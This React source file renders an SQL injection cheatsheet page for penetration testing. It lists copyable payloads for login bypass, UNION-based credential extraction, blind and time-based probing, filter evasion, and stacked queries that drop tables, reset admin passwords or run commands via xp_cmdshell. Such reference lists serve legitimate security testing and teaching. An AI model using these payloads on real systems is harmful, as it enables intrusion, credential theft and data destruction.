"use client"

import React, { useState } from 'react';
import { useDebounce } from '@/hooks/useDebounce';
import { Database, Search, Copy, Check, ChevronDown, ChevronRight, AlertTriangle } from 'lucide-react';

interface Payload {
    payload: string;
    description: string;
}

interface Section {
    title: string;
    payloads: Payload[];
}

const sections: Section[] = [
    {
        title: 'Authentication Bypass',
        payloads: [
            { payload: "' OR '1'='1", description: 'Basic OR bypass' },
            { payload: "' OR '1'='1'--", description: 'OR bypass with comment' },
            { payload: "' OR '1'='1'/*", description: 'OR bypass with block comment' },
            { payload: "admin'--", description: 'Comment out password check' },
            { payload: "' OR 1=1#", description: 'MySQL comment bypass' },
            { payload: "') OR ('1'='1", description: 'Parenthesis bypass' },
            { payload: "' OR ''='", description: 'Empty string comparison' },
        ]
    },
    {
        title: 'Union Based',
        payloads: [
            { payload: "' UNION SELECT NULL--", description: 'Find number of columns' },
            { payload: "' UNION SELECT NULL,NULL--", description: '2 columns' },
            { payload: "' UNION SELECT NULL,NULL,NULL--", description: '3 columns' },
            { payload: "' UNION SELECT 1,2,3--", description: 'Find visible columns' },
            { payload: "' UNION SELECT username,password FROM users--", description: 'Extract credentials' },
            { payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--", description: 'List tables' },
            { payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", description: 'List columns' },
        ]
    },
    {
        title: 'Error Based',
        payloads: [
            { payload: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", description: 'MSSQL error extraction' },
            { payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", description: 'MySQL EXTRACTVALUE' },
            { payload: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", description: 'MySQL error based' },
            { payload: "' AND 1=CAST((SELECT version()) AS int)--", description: 'PostgreSQL CAST error' },
        ]
    },
    {
        title: 'Blind Boolean',
        payloads: [
            { payload: "' AND 1=1--", description: 'True condition' },
            { payload: "' AND 1=2--", description: 'False condition' },
            { payload: "' AND SUBSTRING(username,1,1)='a'--", description: 'Character extraction' },
            { payload: "' AND (SELECT COUNT(*) FROM users)>0--", description: 'Check table exists' },
            { payload: "' AND LENGTH(database())>5--", description: 'Database name length' },
        ]
    },
    {
        title: 'Time Based',
        payloads: [
            { payload: "' AND SLEEP(5)--", description: 'MySQL sleep' },
            { payload: "'; WAITFOR DELAY '0:0:5'--", description: 'MSSQL delay' },
            { payload: "' AND pg_sleep(5)--", description: 'PostgreSQL sleep' },
            { payload: "' AND IF(1=1,SLEEP(5),0)--", description: 'Conditional sleep' },
            { payload: "' OR IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--", description: 'Extract with timing' },
        ]
    },
    {
        title: 'Stacked Queries',
        payloads: [
            { payload: "'; DROP TABLE users--", description: 'Drop table (dangerous!)' },
            { payload: "'; INSERT INTO users VALUES('hacker','password')--", description: 'Insert user' },
            { payload: "'; UPDATE users SET password='hacked' WHERE username='admin'--", description: 'Update password' },
            { payload: "'; EXEC xp_cmdshell('whoami')--", description: 'MSSQL command execution' },
        ]
    },
    {
        title: 'Filter Bypass',
        payloads: [
            { payload: "' oR '1'='1", description: 'Mixed case' },
            { payload: "'/**/OR/**/1=1--", description: 'Comment bypass spaces' },
            { payload: "' OR 0x31=0x31--", description: 'Hex encoding' },
            { payload: "' OR CHAR(49)=CHAR(49)--", description: 'CHAR encoding' },
            { payload: "'%20OR%201=1--", description: 'URL encoded spaces' },
            { payload: "' OR 1/*!50000=*/1--", description: 'MySQL version comment' },
        ]
    },
    {
        title: 'Database Fingerprinting',
        payloads: [
            { payload: "' AND @@version--", description: 'MSSQL version' },
            { payload: "' AND version()--", description: 'MySQL/PostgreSQL version' },
            { payload: "' UNION SELECT banner FROM v$version--", description: 'Oracle version' },
            { payload: "' UNION SELECT sqlite_version()--", description: 'SQLite version' },
        ]
    },
];

const SQLInjectionPage = () => {
    const [searchQuery, setSearchQuery] = useState('');
    const debouncedSearch = useDebounce(searchQuery, 300);
    const [copiedPayload, setCopiedPayload] = useState<string | null>(null);
    const [expandedSections, setExpandedSections] = useState<string[]>(sections.map(s => s.title));

    const copyToClipboard = async (text: string) => {
        await navigator.clipboard.writeText(text);
        setCopiedPayload(text);
        setTimeout(() => setCopiedPayload(null), 2000);
    };

    const toggleSection = (title: string) => {
        setExpandedSections(prev =>
            prev.includes(title) ? prev.filter(t => t !== title) : [...prev, title]
        );
    };

    const filteredSections = sections.map(section => ({
        ...section,
        payloads: section.payloads.filter(p =>
            p.payload.toLowerCase().includes(debouncedSearch.toLowerCase()) ||
            p.description.toLowerCase().includes(debouncedSearch.toLowerCase())
        )
    })).filter(section => section.payloads.length > 0);

    return (
        <div className="min-h-screen bg-black">
            {/* Hero */}
            <section className="relative pt-32 pb-16 px-4 sm:px-6">
                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[300px] bg-orange-500/10 rounded-full blur-[120px] pointer-events-none" />
                
                <div className="relative max-w-4xl mx-auto text-center">
                    <div className="inline-flex items-center gap-2 px-4 py-2 mb-8 rounded-full border border-white/10 bg-white/5">
                        <Database className="w-4 h-4 text-orange-500" />
                        <span className="text-sm text-gray-400">Cheatsheet</span>
                    </div>

                    <h1 className="text-4xl sm:text-5xl font-bold tracking-tight text-white mb-6">
                        SQL <span className="text-orange-500">Injection</span>
                    </h1>

                    <p className="text-lg text-gray-400 max-w-xl mx-auto">
                        Common SQL injection payloads for penetration testing.
                    </p>
                </div>
            </section>

            {/* Warning */}
            <section className="max-w-4xl mx-auto px-4 sm:px-6 mb-8">
                <div className="flex items-start gap-3 p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/20">
                    <AlertTriangle className="w-5 h-5 text-yellow-400 flex-shrink-0 mt-0.5" />
                    <p className="text-sm text-yellow-200/80">
                        <strong>Educational purposes only.</strong> Only test on systems you own or have explicit authorization.
                    </p>
                </div>
            </section>

            {/* Search */}
            <section className="max-w-4xl mx-auto px-4 sm:px-6 mb-8">
                <div className="relative">
                    <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                    <input
                        type="text"
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                        placeholder="Search payloads..."
                        className="w-full pl-11 pr-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white placeholder:text-gray-500 focus:border-orange-500/50 focus:outline-none transition-colors"
                    />
                </div>
            </section>

            {/* Payloads */}
            <section className="max-w-4xl mx-auto px-4 sm:px-6 pb-20">
                <div className="space-y-4">
                    {filteredSections.map((section) => (
                        <div key={section.title} className="rounded-xl border border-white/10 bg-white/[0.02] overflow-hidden">
                            <button
                                onClick={() => toggleSection(section.title)}
                                className="w-full flex items-center justify-between p-4 text-left hover:bg-white/[0.02] transition-colors"
                            >
                                <h2 className="font-medium text-white">{section.title}</h2>
                                <div className="flex items-center gap-2">
                                    <span className="text-xs text-gray-500">{section.payloads.length} payloads</span>
                                    {expandedSections.includes(section.title) 
                                        ? <ChevronDown className="w-4 h-4 text-gray-400" />
                                        : <ChevronRight className="w-4 h-4 text-gray-400" />
                                    }
                                </div>
                            </button>

                            {expandedSections.includes(section.title) && (
                                <div className="border-t border-white/5">
                                    {section.payloads.map((item, index) => (
                                        <div 
                                            key={index}
                                            className="flex items-start justify-between p-4 border-b border-white/5 last:border-0 hover:bg-white/[0.02] transition-colors group"
                                        >
                                            <div className="flex-1 min-w-0">
                                                <p className="text-sm text-gray-400 mb-2">{item.description}</p>
                                                <code className="block text-sm font-mono bg-black/50 px-3 py-2 rounded overflow-x-auto syntax-highlight-sql">
                                                    {item.payload}
                                                </code>
                                            </div>
                                            <button
                                                onClick={() => copyToClipboard(item.payload)}
                                                className="p-2 text-gray-500 hover:text-white sm:opacity-0 sm:group-hover:opacity-100 transition-all ml-2"
                                            >
                                                {copiedPayload === item.payload 
                                                    ? <Check className="w-4 h-4 text-green-400" />
                                                    : <Copy className="w-4 h-4" />
                                                }
                                            </button>
                                        </div>
                                    ))}
                                </div>
                            )}
                        </div>
                    ))}
                </div>
            </section>
        </div>
    );
};

export default SQLInjectionPage;
